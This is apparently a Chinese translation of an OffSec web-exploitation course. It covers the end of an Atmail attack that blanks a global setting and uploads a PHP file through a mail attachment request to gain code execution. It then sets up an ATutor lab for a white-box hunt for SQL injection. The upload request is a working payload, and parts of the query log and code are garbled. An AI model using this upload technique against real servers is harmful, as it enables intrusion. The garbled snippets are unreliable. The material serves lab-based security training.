
### 列表 50 - 触发更新

你可能注意到在此请求中，我们使用了之前提到的硬编码 `MD5` 值，但它并不是强制要求的。我们绝对必须拥有的是管理员会话 cookie（`admin session cookie`）。

另外注意，根据我们的初始计划，我们将 `tmpFolderBaseline` 设置为空值。

### 2.6.5 练习

重放 `列表 50` 中列出的 `POST` 请求，并验证你是否成功修改全局设置。你可以通过登录数据库并检查设置来验证。

登录数据库后，运行以下语句：

```mysql
select * from Config where keyName="tmpFolderBaseline";
```

| configId | section | keyName | keyValue | keyType |
|----------|---------|---------|----------|---------|
| 92 | global | tmpFolderBaseline | tmp/ | String |

```
1 row in set (0.00 sec)
```

### 列表 51 - 验证默认的 tmpFolderBaseline 全局设置

在运行攻击后，重新运行 SQL 语句。你应该会得到一个空的 `keyValue` 字段。

```mysql
select * from Config where keyName="tmpFolderBasename";
```

| configId | section | keyName | keyValue | keyType |
|----------|---------|---------|----------|---------|
| 92 | global | tmpFolderBasename | | String |

```
1 row in set (0.00 sec)
mysql>
```

### 列表 52 - 验证针对 tmpFolderBasename 全局设置的攻击有效

## 2.6.6 attachmentAction 漏洞触发

现在我们已经更改了全局设置，我们就可以通过邮件附件上传我们选择的任何内容（例如 `PHP` 代码），并访问我们现在知道可以在浏览器中访问的 `URI` 来访问它。列表显示了一个带有恶意附件的发送邮件的 `HTTP` 请求。

```http
POST /index.php/mail/composemessage/addattachment/composeID HTTP/1.1
Host: atmail
Cookie: atmail=6jpln2q7pvscg46n6svgb3ba0
Connection: close
Content-Type: multipart/form-data;
boundary=583546921219346211646254250
Content-Length: 238
```

```
----------------------------583546921219346211646254250
Content-Disposition: form-data; name="newAttachment"; filename="offsec.php"
Content-Type:

<?php phpinfo(); ?>

----------------------------583546921219346211646254250--
```

### 列表 53 - 上传 PHP 代码

注意，已验证的用户只是普通用户。我们不需要管理员权限即可执行此攻击，所有的 `globalSaveAction` 攻击已完成。

然而，假设我们可能完全无法访问 `Atmail` 系统，我们可以在 `globalSaveAction` 漏洞旁，在会话劫持有效负载（`session riding payload`）中使用此漏洞。

另外注意 `Content-Type` 被设置为空。我们在这里不会解释原因，但可以在 `列表 36` 中找到。我们将此留作给你们的一个小练习。

上传后，我们能够访问注入的 shell：

```
/usr/local/atmail/webmail/a/d/adminoffseclocal--offsec.php
```

### 列表 54 - 上传 shell 的位置

![](img/5d1c2c08c609e4691e93ba5fa2d52a8a_85_0.png)

```
atmail@a/d/adminoffsecl/--offsec.php

Most Visited Offensive Security Kali Linux Kali Docs Tools Exploit-DB Airrack-
```

# 高级Web攻击与利用

# 3 ATutor 身份认证绕过与 RCE

## 3.1 概述

`ATutor` 是一个基于 Web 的学习管理系统（`LMS`），已经存在多年。根据厂商网站上找到的信息，它被成千上万的机构使用。考虑到用户基数较大，我们决定查看其内部机制。这在某种程度上是因为 `ATutor` 是开源的，使得任何人都可以进行代码审计。

本模块涵盖了对 `ATutor 2.2.1` 中多个漏洞的深度分析和利用。我们将研究的第一个漏洞是 `SQL` 注入，它可以从 `ATutor` 后端泄露敏感信息。一旦泄露，这些信息就可以有效地绕过身份认证机制。最后，在获得权限后，我们将利用一个导致远程执行的认证后文件上传漏洞。

## 3.2 开始

从你的学生控制面板还原 `ATutor` 虚拟机。你可以在课程材料中找到 `ATutor` 服务器和应用程序账户的凭据。

`ATutor` 为你提供了三个级别的访问：

- 学生（`Student`）
- 教师（`Teacher`）
- 管理员（`Administrator`）

对于本模块而言，我们将从未验证的角度攻击漏洞的 `ATutor` 实例，不需要凭据。在模块的后续部分，我们将使用适当的凭据以方便漏洞开发过程。

### 3.2.1 设置环境

在本模块中，我们将从白盒角度攻击 `ATutor`。我们将分析目标应用程序的源代码并启用数据库日志，以检查后端数据库处理的所有 `SQL` 查询。这将使我们的漏洞发现和漏洞开发变得更加容易。

`ATutor` 使用 `MySQL` 数据库引擎，为了启用数据库日志，我们可以通过 `SSH` 登录到目标服务器并进行必要的更改。

登录后，我们将打开位于 `/etc/mysql/my.cnf` 的 `MySQL` 服务器配置文件，并取消“Logging and Replication（日志与复制）”部分下以下几行的注释：

```bash
student@tutor:~$ sudo nano /etc/mysql/my.cnf

[mysql]

general_log_file = /var/log/mysql/mysql.log
```

### 列表 55 - 编辑 MySQL 配置并重启 MySQL 服务以记录所有查询

在修改配置文件后，我们需要重启 `MySQL` 服务以使更改生效：

```bash
student@tutor:~$ sudo systemctl restart mysql
```

### 列表 56 - 重启 MySQL 服务以应用新配置

然后，我们可以使用 `tail` 命令检查 `MySQL` 日志文件，并实时查看 Web 应用程序执行的所有查询。

```bash
student@tutor:~$ tail -f /var/log/mysql/mysql.log
```

### 列表 57 - 查找 ATutor 正在执行的所有查询

为了通过 `tail` 命令测试查询日志设置，只需浏览 `ATutor` Web 应用程序。

# 课程服务器

| 登录 | 注册 | 浏览课程 | 网络 | 首页 |

# 搜索

* 单词
`[offsec]`
匹配
( ) 所有单词
( ) 任意单词
在以下处查找结果
( ) 所有可用课程
搜索范围
( ) 全部 ( ) 内容 ( ) 论坛
显示方式
( ) 作为一个独立内容页
( ) 按课程分组
( ) 课程摘要
`[搜索]`

0 搜索搜索结果

> 图 65：对 `ATutor` Web 应用程序执行搜索

## 高级Web攻击与利用

```
180514-12:06:42 207 Query root@localhost at atutor

207 Query SET NAMES utf8

207 Query SET @config = config

207 Query SELECT * FROM AT_LANGUAGES ORDER BY name = 'default'

207 Query SELECT * FROM AT_MODULEES WHERE dir_name = 'default'

207 Query SELECT CUSTOMIZED FROM AT_MODULEES WHERE dir_name = 'default'

207 Query SELECT dir_name, admin_privilege, status, cron_interval, last_run

207 Query SELECT * FROM AT_MODULEES WHERE dir_name = 'default'

207 Query SELECT L.* FROM AT_LANGUAGES L, AT_LANGUAGES P WHERE L.language_code='en'

207 Query SELECT L.* FROM AT_LANGUAGES L WHERE L.language_code='en'

207 Query

FROM AT_MODULEES WHERE dir_name = 'default'

AND L.term, page = 'index.php'

207 Query ORDER BY var module_id ASC

207 Query INSERGE INFO INTO AT_LANGUAGES ('term', 'page') VALUES ('test', 'search.php')

207 Query

FROM AT_MODULEES WHERE dir_name = 'core/services' && status = 2

207 Query SELECT C.id, module, C.content_id, C.content, C.title, C.C, Cyberworks Pro

207 Query FROM AT_MODULEES M LEFT JOIN AT_MODULES C ON M.id = C.module_id

207 Query SELECT group_id, title AS form_title, group_forms, group_id, t

* FROM at_groups T RIGHT JOIN at_groups ON T.group_id = M.group_id

WHERE T.group_id = 1

207 Query SELECT group_id, title, description, num_posts, last_post, last

id_id, title, description, num_posts, last_post, last to edit FROM at_groups NATIONAL

groups_members NATIONAL GROUP BY id

207 Query SELECT g.*, group_id_from FROM at_groups g INNER JOIN at_groups_types USING (type)

pe_id

207 Query group_id=2 AS group WHERE member_id AS group_forms USING (forum, id) WHERE

#Softfetch)

207 Query Verifying that query logging is working
```

图 65：验证查询日志是否正常工作

此外，由于我们处理的是一个 `PHP` Web 应用程序，在开启此指令后，我们将能够以触发器的形式看到 `PHP` 错误，这有助于我们的分析。要做到这一点，我们需要向 `/etc/php/apache2/php.ini` 添加以下行：

```
display_errors = On
```

### 列表 58 - 配置 PHP 显示详细错误

最后，我们需要重启 `Apache` 服务以使新配置生效。

```bash
student@tutor:~$ sudo systemctl restart apache2
```

### 列表 59 - 重启 Apache 服务以应用新配置

完成 `MySQL` 和 `Apache` 的配置后，我们准备好开始对 `ATutor` Web 应用程序进行漏洞发现过程。

## 3.3 初始漏洞发现

正如我们访问源代码时通常的情况，我们首先喜欢观察周围并对应用程序有一个直观的感觉。它是如何组织的？我们能针对代码库使用搜索字符串吗？是否还有其他方法可以帮助我们精简并减少妥善调查目标所需的时间？

在操作过程中，我们发现很容易识别出所有公开访问的 `ATutor` Web 页面，特别是那些不需要身份验证且源码中包含以下行的页面：

```php
$user_location = 'public';
```

### 列表 60 - 所有公开访问的 ATutor Web 页面都可以轻松识别

AWAE Copyright © 2019 Offsec.

## 高级Web攻击与利用

始终分析未身份验证的部分是非常重要的，因为它们最敏感。正如我们在模块中将看到的，未验证的代码将允许我们获得初始立脚点。

考虑到这一点，我们决定使用以下 `grep` 命令列出所有公开访问的页面：

```bash
student@tutor:~$ grep -rn /var/html/atutor -e "^user_location = public'"
```

### 列表 61 - 列出 ATutor 页面

花费了一些时间后，我们发现了一部分 `ATutor` 页面。检查 `index_public.php`，我们看到了对 `p` 和 `rand_key` 变量的检查，但似乎阻止我们到达第 38 行的语句，那里情况变得更有趣。

```php
23: if(isset($_POST['rand_key'])){
24:     $rand_key = $addslashes($_POST['rand_key']);    //我们需要转义吗？
25: }
26: ///分页器设置
27: if(isset($_GET['p'])) {
28:     $page = intval($_GET['p']);
29: }
30: if (isset($_$_page)) {
31:     $page = 1;
32: }
33: $count = (($page-1) * SOCIAL_FRIEND_SEARCH_MAX) + 1;
34:     $offset = ($page-1) * SOCIAL_FRIEND_SEARCH_MAX;
35:
36:
37: //如果设置了 $_GET['q'],则处理 Ajax
38: if (isset($_GET['q'])) {
39:     $query = $addslashes($_GET['q']);
40:
41:     //通过搜索获取朋友列表
42:     $search_result = searchFriends($query);
```

### 列表 62 - index_public.php 的部分源码

`$_user_location` 变量表示公开访问，在审查了这些文件以及 `index_public.php` 的其余部分后，我们验证了不需要身份验证（图 67）。

图 67：无需身份验证即可访问 index_public.php

```php
44:
45:
    if (empty($search_result)) {
46:
        echo '<div class="suggestions">_AT('suggestions)').<br/>;
47:
        $counter = 0;
48:
        foreach ($search_result as $member_id=$member_array) {
49:
            //display 10 suggestions
50:
            if ($counter > 10) {
51:
                break;
52:
            }
53:
54:
            echo '<a href="javascript:void(0);" onclick="document.getElementById(\'search_friends\').value=.printSocialName($member_id, false);\document.getElementById(\'search_friends\').submit(\".printSocialName($member_id, false)\")';
```

在第 63 行，代码首先检查 `GET` 参数 `q` 是否设置（第 38 行），如果设置，其包含的值似乎使用 `addslashes` 函数进行了过滤（第 39 行）。紧接着，我们用户控制的值被传递给 `searchFriends` 函数（第 42 行）。

阅读上述代码可能会让你停顿一下。当我们看到像 `query` 或 `gry` 的名称，或者包含字符串 `search` 的函数名时，我们的直觉应该是顺着路径查看代码将其带向何处。它可能让我们无功而归，也可能引导我们找到处理用户控制数据的代码，导致无事可做。尽管如此，在最坏的情况下，我们可以学会应用程序如何处理输入，这在我们遇到类似情况时可以节省时间。

现在，我们将跟踪这个函数并查看我们正在处理的是什么。下面的快速 `grep` 搜索帮助我们查看 `searchFriends` 函数的实现。

```bash
student@tutor: $ grep -rm /var/html/Atutor -e "function searchFriends" --color
```
